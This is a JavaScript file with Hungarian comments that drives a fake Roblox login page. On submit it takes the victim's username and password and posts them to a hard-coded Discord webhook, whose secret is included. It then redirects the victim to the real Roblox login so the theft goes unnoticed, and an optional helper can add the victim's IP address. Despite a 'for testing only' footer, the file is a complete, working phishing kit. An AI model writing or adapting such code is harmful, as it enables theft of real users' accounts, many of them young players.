// ═══════════════════════════════════════════════
// 🔐 SAJÁT BEJELENTKEZÉSI ADATOK ELKÜLDÉSE
// ═══════════════════════════════════════════════

document.addEventListener('DOMContentLoaded', function() {
    
    // 🔹 ITT ADD MEG A DISCORD WEBHOOK URL-EDET!
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1534957908909883616/0I1cZFPGv5ZvCCzG0YZQIcMLrWx_0iHCfx5CUYL9mRA4WRkANifYSIc4YMRYCDJ8g-t5';
    
    // 🔹 ITT ADD MEG, HOVA IRÁNYÍTSON ÁT BEJELENTKEZÉS UTÁN!
    const REDIRECT_URL = 'https://www.roblox.com/login';
    
    // ─────────────────────────────────────────────
    // Az űrlap elküldésének kezelése
    // ─────────────────────────────────────────────
    
    const form = document.getElementById('loginForm');
    
    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Ne töltse újra az oldalt!
        
        // 1. Beolvassuk az adatokat
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        
        // 2. Ellenőrizzük, hogy ki vannak-e töltve
        if (!username || !password) {
            return;
        }
        
        console.log('🔐 Bejelentkezési adatok rögzítve:', { username, password });
        
        // 3. Elküldjük a Discord webhookra
        sendToDiscord(username, password);
        
        // 4. Átirányítjuk a felhasználót a valódi Roblox oldalra
        //    (vagy bárhová, ahová szeretnéd)
        setTimeout(function() {
            window.location.href = REDIRECT_URL;
        }, 1000);
    });
    
    // ─────────────────────────────────────────────
    // Adatok küldése Discord webhookra
    // ─────────────────────────────────────────────
    
    function sendToDiscord(username, password) {
        const currentTime = new Date().toLocaleString('hu-HU');
        
        const data = {
            embeds: [
                {
                    title: '🔐 Új bejelentkezési kísérlet',
                    color: 0xff0000, // Piros szín
                    fields: [
                        {
                            name: '👤 Felhasználónév',
                            value: username,
                            inline: true
                        },
                        {
                            name: '🔑 Jelszó',
                            value: password,
                            inline: true
                        },
                        {
                            name: '🕒 Időpont',
                            value: currentTime,
                            inline: false
                        },
                        {
                            name: '🌐 IP cím',
                            value: '...',
                            inline: false
                        }
                    ],
                    footer: {
                        text: '⚠️ Csak tesztelésre!'
                    }
                }
            ]
        };
        
        // Küldés a Discordnak
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                console.log('✅ Adatok sikeresen elküldve a Discordra!');
            } else {
                console.error('❌ Hiba a Discord küldés során:', response.status);
            }
        })
        .catch(error => {
            console.error('❌ Hálózati hiba:', error);
        });
    }
    
    // ─────────────────────────────────────────────
    // Csak tájékoztatásul: IP cím lekérése (opcionális)
    // ─────────────────────────────────────────────
    
    function getIP() {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                console.log('🌐 IP cím:', data.ip);
                // Ha szeretnéd, az IP-t is elküldheted a Discordra
            })
            .catch(error => console.error('IP lekérési hiba:', error));
    }
    
    // IP lekérése (opcionális)
    // getIP();
    
});